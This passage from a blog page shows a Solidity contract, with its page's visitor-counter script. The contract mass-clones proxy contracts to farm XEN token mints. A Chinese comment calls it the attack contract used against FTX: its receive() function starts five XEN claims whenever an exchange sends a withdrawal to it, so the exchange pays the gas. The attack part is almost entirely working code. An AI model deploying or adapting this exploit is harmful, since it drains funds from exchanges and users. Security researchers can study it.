/span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">function xen() pure returns(IXEN) &#123;</span><br><span class="line">    return IXEN(0x9C47A6c4814CC8D70d459C02F4684F8A9D538A95);</span><br><span class="line">    // return IXEN(0xd9145CCE52D386f254917e481eB44e9943F39138);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IXEN&#123;</span><br><span class="line">    function claimRank(uint256 term) external;</span><br><span class="line">    function claimMintReward() external;</span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool);</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GET&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    function claimRank(uint256 term) public &#123;</span><br><span class="line">        xen().claimRank(term);</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function claimMintReward() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        xen().claimMintReward();</span><br><span class="line">        uint256 balance = xen().balanceOf(address(this));</span><br><span class="line">        xen().transfer(owner, balance);</span><br><span class="line">        selfdestruct(payable(tx.origin));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 0xcb1bf0801fa7c4a7991f6c820e895285c782351c Goerli</span><br><span class="line">contract GETXEN &#123;</span><br><span class="line">    mapping (address=&gt;mapping (uint256=&gt;address[])) public userContracts;</span><br><span class="line">    address private immutable get;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        get = address(new GET());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _clone(address target) internal returns (address result) &#123;</span><br><span class="line">        bytes20 targetBytes = bytes20(target);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            let clone := mload(0x40)</span><br><span class="line">            mstore(clone, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)</span><br><span class="line">            mstore(add(clone, 0x14), targetBytes)</span><br><span class="line">            mstore(add(clone, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)</span><br><span class="line">            result := create(0, clone, 0x37)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimRank(uint256 times, uint256 term) external &#123;</span><br><span class="line">        address user = tx.origin;</span><br><span class="line">        for(uint256 i; i&lt;times; ++i)&#123;</span><br><span class="line">            address clone = _clone(get);</span><br><span class="line">            GET(clone).claimRank(term);</span><br><span class="line">            userContracts[user][term].push(address(clone));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimMintReward(uint256 times, uint256 term) external &#123;</span><br><span class="line">        address user = tx.origin;</span><br><span class="line">        for(uint256 i; i&lt;times; ++i)&#123;</span><br><span class="line">            uint256 count = userContracts[user][term].length;</span><br><span class="line">            address clone = userContracts[user][term][count - 1];</span><br><span class="line">            GET(clone).claimMintReward();</span><br><span class="line">            userContracts[user][term].pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // FTX 通过提币到攻击合约触发XEN的攻击</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        this.claimRank(5, 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>
